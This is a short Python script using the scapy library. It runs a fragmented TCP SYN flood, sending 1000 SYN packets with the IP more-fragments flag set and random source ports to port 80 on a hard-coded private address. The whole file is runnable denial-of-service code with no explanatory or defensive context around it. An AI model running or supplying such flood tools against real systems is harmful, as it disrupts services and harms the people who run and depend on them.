
from scapy.all import *

target_ip = "192.168.1.10"
target_port = 80

def fragmented_syn_flood():
    for i in range(1000):
        ip_layer = IP(dst=target_ip, flags="MF", id=12345)
        tcp_layer = TCP(sport=RandShort(), dport=target_port, flags="S")
        payload = Raw(load="X" * 8)
        
        pkt = ip_layer / tcp_layer / payload
        send(pkt, verbose=False)

if __name__ == "__main__":
    fragmented_syn_flood()
